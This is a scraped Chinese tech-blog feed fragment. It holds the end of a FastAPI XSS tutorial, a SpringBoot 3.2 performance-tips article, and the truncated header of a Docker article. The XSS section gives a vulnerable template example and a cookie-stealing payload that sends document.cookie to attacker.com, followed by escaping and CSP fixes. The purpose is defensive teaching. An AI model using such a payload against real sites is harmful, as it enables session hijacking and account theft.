  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:24:33.000Z" title="Mon Nov 24 2025 05:24:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">跨站脚本（XSS）</h2>
<h3 data-id="heading-1">1. 漏洞原理</h3>
<p>XSS 是由于 <strong>用户输入的恶意脚本未被转义，直接在浏览器中执行</strong>，导致攻击者窃取 Cookie、伪造身份或钓鱼。FastAPI 虽以 JSON 接口为主，但若返回 HTML 内容（如模板渲染）或前端直接渲染 API 返回的用户输入，仍可能触发 XSS。</p>
<h3 data-id="heading-2">2. 攻击场景（FastAPI 漏洞代码）</h3>
<p>假设 FastAPI 接口返回包含用户输入的 HTML 页面（使用 Jinja2 模板）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request
<span class="hljs-keyword">from</span> fastapi.templating <span class="hljs-keyword">import</span> Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory=<span class="hljs-string">"templates"</span>)

<span class="hljs-comment"># 漏洞接口：未转义用户输入，直接渲染到HTML</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 危险！username直接拼接进HTML，若包含脚本会执行</span>
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: username  <span class="hljs-comment"># 攻击者可构造username=&lt;script&gt;恶意代码&lt;/script&gt;</span>
    })
</code></pre>
<p>对应的<code>templates/welcome.html</code>模板：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 未转义渲染用户输入 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome, {{ username }}!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">攻击步骤：</h4>
<ol>
<li>攻击者访问接口，构造恶意<code>username</code>：<code>/welcome?username=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
<li>浏览器渲染页面时，<code> &lt;script&gt;</code>标签被执行，弹出 “XSS” 提示（简单演示）。</li>
<li>进阶攻击：窃取 Cookie 并发送到攻击者服务器：<code>/welcome?username=&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>若用户已登录，Cookie 包含会话信息，攻击者可劫持会话。</li>
</ol>
<h3 data-id="heading-4">3. 防护方案（修复代码 + 最佳实践）</h3>
<p>核心原则：<strong>对用户输入进行 HTML 转义，或避免在 HTML 中直接渲染用户输入</strong>。</p>
<h4 data-id="heading-5">修复方案 1：模板自动转义（Jinja2 默认开启）</h4>
<p>Jinja2 模板默认会对<code>{{ variable }}</code>进行 HTML 转义（将<code>&lt;</code>转义为<code>&amp;lt;</code>，<code>&gt;</code>转义为<code>&amp;gt;</code>等），恶意脚本会被当作普通文本显示。上述代码无需修改，Jinja2 已自动防护 —— 若用户输入<code>&lt;script&gt;</code>，会被转义为<code>&amp;lt;script&amp;gt;</code>，不会执行。</p>
<h4 data-id="heading-6">修复方案 2：手动转义（若需自定义渲染）</h4>
<p>若使用其他模板引擎或手动拼接 HTML，需手动转义用户输入（使用<code>html</code>模块）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> html

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 手动转义用户输入，确保安全</span>
    safe_username = html.escape(username)
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: safe_username
    })
</code></pre>
<h4 data-id="heading-7">额外防护：</h4>
<ul>
<li>避免返回 HTML：FastAPI 优先使用 JSON 接口，前端通过 JavaScript 渲染数据（JSON 不会执行脚本）。</li>
<li>设置安全响应头：通过<code>fastapi.middleware.cors.CORSMiddleware</code>限制跨域，或添加<code>Content-Security-Policy</code>（CSP）头，禁止加载外部脚本。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧]]></title>    <link>https://juejin.cn/post/7576077034742824994</link>    <guid>https://juejin.cn/post/7576077034742824994</guid>    <pubDate>2025-11-24T04:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576077034742824994" data-draft-id="7575413146923221007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T04:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:16:54.000Z" title="Mon Nov 24 2025 04:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>SpringBoot 作为 Java 生态中最流行的微服务框架之一，其易用性和开箱即用的特性深受开发者喜爱。然而，随着应用规模的扩大和业务复杂度的提升，性能问题逐渐成为开发者关注的焦点。SpringBoot 3.2 在性能方面做了多项改进，但如何充分利用这些特性并进一步优化应用，仍然是许多开发者的挑战。</p>
<p>本文将深入探讨 <strong>7 个关键技巧</strong>，涵盖从代码优化到基础设施调优的全方位实践，帮助你将 SpringBoot 应用的性能提升 <strong>50% 甚至更多</strong>。无论你是正在迁移到 SpringBoot 3.2，还是希望优化现有应用，这些技巧都能为你提供切实可行的指导。</p>
<hr/>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. <strong>启用 SpringBoot 3.2 的新特性：虚拟线程（Virtual Threads）</strong></h3>
<p>Java 21 引入了虚拟线程（Project Loom），而 SpringBoot 3.2 对其提供了原生支持。虚拟线程可以显著减少线程创建和上下文切换的开销，特别适合高并发场景。</p>
<h4 data-id="heading-4"><strong>如何启用？</strong></h4>
<pre><code class="hljs language-properties" lang="properties">spring.threads.virtual.enabled=true
</code></pre>
<h4 data-id="heading-5"><strong>适用场景</strong></h4>
<ul>
<li>I/O密集型任务（如数据库查询、HTTP请求）。</li>
<li>高并发微服务场景。</li>
</ul>
<h4 data-id="heading-6"><strong>注意事项</strong></h4>
<ul>
<li>CPU密集型任务可能不会受益于虚拟线程。</li>
<li>JDK必须升级至21或更高版本。</li>
</ul>
<hr/>
<h3 data-id="heading-7">2. <strong>优化 JVM 参数：选择合适的垃圾收集器</strong></h3>
<p>JVM的垃圾收集策略直接影响应用的吞吐量和延迟。SpringBoot默认使用G1 GC（Garbage-First），但在不同负载下可能需要调整或更换GC策略。</p>
<h4 data-id="heading-8"><strong>推荐配置</strong></h4>
<ul>
<li><strong>低延迟场景（如金融交易系统）</strong>: ZGC或Shenandoah GC</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar -XX:+UseZGC -Xmx4g -Xms4g
</code></pre>
<ul>
<li><strong>高吞吐量场景（如批处理任务）</strong>: G1 GC或Parallel GC</li>
</ul>
<h4 data-id="heading-9"><strong>关键调优点</strong></h4>
<ul>
<li><code>MaxGCPauseMillis</code>：控制最大停顿时间（默认200ms）。</li>
<li><code>InitiatingHeapOccupancyPercent</code>：触发GC的堆占用百分比（默认45%）。</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. <strong>利用 GraalVM Native Image （AOT编译）减少启动时间和内存占用</strong></h3>
<p>GraalVM Native Image可以将SpringBoot应用编译为本地可执行文件，极大降低启动时间和内存消耗（通常减少50%以上）。Spring Boot3.2对GraalVM的支持更加成熟。</p>
<h4 data-id="heading-11"><strong>实现步骤</strong></h4>
<p>1.添加依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.experimental<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aot<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>2.生成Native镜像:</p>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:build-image -DskipTests
</code></pre>
<h4 data-id="heading-12"><strong>优缺点分析</strong></h4>
<p>✅ 优势：极快的启动速度（毫秒级）、更低的内存占用。<br/>
❌ 限制：反射/动态代理需要额外配置、调试复杂度较高。</p>
<hr/>
<h3 data-id="heading-13">4. <strong>合理设计缓存策略：避免重复计算与I/O开销</strong></h3>
<p>缓存是提升性能的银弹之一，但错误的使用会导致数据不一致或内存泄漏。SpringBoot提供了多种缓存抽象（Caffeine、Redis等）。</p>
<h4 data-id="heading-14"><strong>最佳实践建议</strong></h4>
<p>1.<strong>多级缓存架构</strong>: Local Cache + Redis分布式缓存。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "userCache", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-comment">// DB查询逻辑...</span>
}
</code></pre>
<p>2.<strong>避免缓存击穿</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(cacheNames="users", sync=true)</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> { ... }
</code></pre>
<hr/>
<p>###5.<strong>数据库访问层优化：JPA/Hibernate调优</strong></p>
<p>数据库通常是性能瓶颈所在,以下是一些关键优化点:</p>
<p>#####a)启用Hibernate二级缓存:</p>
<pre><code class="hljs language-properties" lang="properties">spring.jpa.properties.hibernate.cache.use_second_level_cache=true
spring.jpa.properties.hibernate.cache.provider_class=org.ehcache.jsr107.EhcacheCachingProvider
</code></pre>
<p>#####b)批量处理N+1查询问题:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Bad: </span>
List&lt;User&gt; users = userRepository<span class="hljs-selector-class">.findAll</span>();
users<span class="hljs-selector-class">.forEach</span>(u -&gt; System.out.println(u.getOrders())); <span class="hljs-comment">// N+1 queries!</span>

<span class="hljs-comment">// Good:</span>
<span class="hljs-keyword">@Query</span>(<span class="hljs-string">"SELECT u FROM User u JOIN FETCH u.orders"</span>)
List&lt;User&gt; findAllWithOrders();
</code></pre>
<hr/>
<p>###6.<strong>HTTP/2与连接池配置</strong></p>
<p>网络传输效率对微服务至关重要:</p>
<p>#####a)强制启用HTTP/2(需TLS):</p>
<pre><code class="hljs language-properties" lang="properties">server.http2.enabled=true
</code></pre>
<p>#####b)WebClient连接池配置(适用于Reactive应用):</p>
<pre><code class="hljs language-scss" lang="scss">HttpClient<span class="hljs-selector-class">.create</span>()
          <span class="hljs-selector-class">.option</span>(ChannelOption.CONNECT_TIMEOUT_MILLIS,<span class="hljs-number">5000</span>)
          <span class="hljs-selector-class">.doOnConnected</span>(c-&gt;c.addHandlerLast(new ReadTimeoutHandler(<span class="hljs-number">10</span>)));
</code></pre>
<hr/>
<p>###7.<strong>监控与持续优化:使用Micrometer+Actuator</strong></p>
<p>没有度量就没有优化.Spring Boot Actuator提供丰富的监控端点:</p>
<p>#####核心指标采集配置:</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">management.endpoints.web.exposure.include</span>=health,metrics,prometheus

<span class="hljs-comment"># Prometheus示例格式输出:</span>
http_server_requests_seconds_count{<span class="hljs-attr">uri</span>=<span class="hljs-string">"/api/users"</span>,status=<span class="hljs-string">"200"</span>}<span class="hljs-number">42</span>`
</code></pre>
<p>通过Grafana仪表盘可直观发现性能瓶颈.</p>
<hr/>
<p>##总结</p>
<p>本文介绍的7大技巧从JVM底层到架构层面全方位覆盖了Spring Boot性能优化的关键路径:</p>
<p>1️⃣利用虚拟线程处理高并发IO<br/>
2️⃣精细调节JVM参数<br/>
3️⃣原生编译技术降本增效<br/>
4️⃣智能缓存减轻后端压力<br/>
5️⃣ORM层深度调优<br/>
6️⃣网络传输协议升级<br/>
7️⃣建立可观测性体系</p>
<p>实际应用中需要根据具体场景组合搭配这些策略.A/B测试是验证效果的最佳方式.Spring Boot的强大之处在于它提供了充分的灵活性让开发者可以在"约定优于配置"的基础上进行深度定制.</p>
<p>真正的极致性能来源于对每个技术组件的深刻理解与合理运用,希望本指南能帮助您的应用突破性能瓶颈!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker 数据持久化完全指南：四种挂载方式详解与实战]]></title>    <link>https://juejin.cn/post/7575751471842295844</link>    <guid>https://juejin.cn/post/7575751471842295844</guid>    <pubDate>2025-11-24T03:43:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842295844" data-draft-id="7575651989985935414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker 数据持久化完全指南：四种挂载方式详解与实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:43:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker 数据持久化完全指南：四种挂载方式详解与实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:43:03.000Z" title="Mon Nov 24 2025 03:43:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
